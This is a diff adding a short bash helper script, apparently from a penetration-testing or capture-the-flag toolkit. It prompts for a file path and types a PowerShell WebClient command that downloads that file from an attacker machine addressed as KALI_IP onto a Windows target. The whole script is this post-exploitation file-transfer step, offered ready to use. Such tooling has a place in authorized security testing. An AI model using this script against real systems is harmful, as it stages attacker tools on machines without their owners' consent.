@@ -1,0 +1,7 @@
+#!/bin/bash
+
+B_PATH=$(zenity --entry --title="Path" --text="Enter path from webroot:")
+F_NAME=$(basename $B_PATH)
+
+type_command "powershell \"(New-Object System.Net.WebClient).DownloadFile('http://${KALI_IP}/${B_PATH}', '${F_NAME}')\""
+type_newline
